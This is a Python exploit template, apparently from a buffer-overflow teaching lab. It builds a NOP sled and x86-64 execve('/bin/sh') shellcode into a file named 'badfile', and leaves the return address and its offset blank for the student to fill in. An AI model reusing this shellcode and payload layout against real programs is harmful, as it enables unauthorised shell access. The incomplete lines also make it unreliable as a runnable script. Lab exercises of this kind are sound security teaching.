#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
    "\x48\x31\xc0"                   # xor    rax, rax
    "\x48\x89\xc7"                   # mov    rdi, rax
    "\x50"                           # push   rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rbx, 0x68732f2f6e69622f
    "\x53"                           # push   rbx
    "\x48\x89\xe7"                   # mov    rdi, rsp           
    "\x50"                           # push   rax   
    "\x57"                           # push   rdi   
    "\x48\x89\xe6"                   # mov    rsi, rsp          
    "\x48\x31\xd2"                   # xor    rdx, rdx           
    "\xb0\x3b"                       # mov    al, 0x3b(=59)      
    "\x0f\x05"                       # syscall                   
).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(300))

# Put the shellcode at the end
start = 300 - len(shellcode)
content[start:] = shellcode	

# Put the address at offset ?
ret = 
content[] = (ret).to_bytes(8, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
